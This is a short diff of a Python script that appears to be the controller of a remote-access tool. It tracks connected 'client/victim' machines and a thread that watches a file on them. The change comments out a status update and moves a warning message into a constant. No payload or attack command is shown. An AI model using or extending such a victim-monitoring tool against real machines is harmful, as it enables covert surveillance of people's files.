@@ -170,8 +170,8 @@ if __name__ == '__main__':
                                     global_thread.join()
                                     print(constants.THREAD_STOPPED_MSG)
 
-                                    # Set status to False
-                                    connected_clients[client_socket] = (client_ip, client_port, status, False)
+                                    # # Set status to False
+                                    # connected_clients[client_socket] = (client_ip, client_port, status, False)
 
                                     # Set global thread to None
                                     global_thread = None
@@ -183,9 +183,7 @@ if __name__ == '__main__':
                                 # Set global thread to None
                                 global_thread = None
                                 print(constants.KEYBOARD_INTERRUPT_MSG)
-                                print("[+] WARNING: You are not allowed to perform any actions on client/victim until "
-                                      "they have performed one final event on the file that was currently being watched"
-                                      "(i.e. Until this Watch_File_Client_Socket thread has finished...")
+                                print(constants.STOP_WATCH_THREAD_CONCURRENCY_WARNING.format(client_ip, client_port))
                                 pass
                         else:
                             print(constants.NOT_WATCHING_FILE_ERROR)
